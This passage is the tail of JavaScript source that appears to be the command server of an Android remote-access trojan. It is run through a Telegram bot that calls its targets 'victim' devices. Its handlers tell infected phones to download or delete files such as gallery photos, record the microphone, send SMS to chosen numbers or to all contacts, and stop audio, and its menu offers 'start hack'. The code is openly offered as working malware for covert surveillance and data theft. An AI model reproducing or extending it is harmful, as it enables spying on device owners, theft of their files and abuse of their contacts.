                '❤ 𝚃𝙷𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝚂𝙴𝙽𝙳 𝙾𝙽 𝚅𝙸𝙲𝚃𝙾𝙼 𝙳𝙴𝚅𝙸𝙲𝙴 𝚆𝙰𝙸𝚃 𝙵𝙴𝚆 𝚂𝙴𝙲𝙾𝙳𝚂 𝙵𝙾𝚁 𝚁𝙴𝙲𝙸𝚅𝙴 𝙳𝙰𝚃𝙰 ❤',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ ❤"], ["❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
                '❤ 𝚃𝙷𝙴 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝚂𝙴𝙽𝙳 𝙾𝙽 𝚅𝙸𝙲𝚃𝙾𝙼 𝙳𝙴𝚅𝙸𝙲𝙴 𝚆𝙰𝙸𝚃 𝙵𝙴𝚆 𝚂𝙴𝙲𝙾𝙳𝚂 𝙵𝙾𝚁 𝚁𝙴𝙲𝙸𝚅𝙴 𝙳𝙰𝚃𝙰 ❤',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["❤ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ ❤"], ["❤ 𝗌ᴛᴀʀᴛ ʜᴀᴄᴋ ❤"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
            '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 22222);
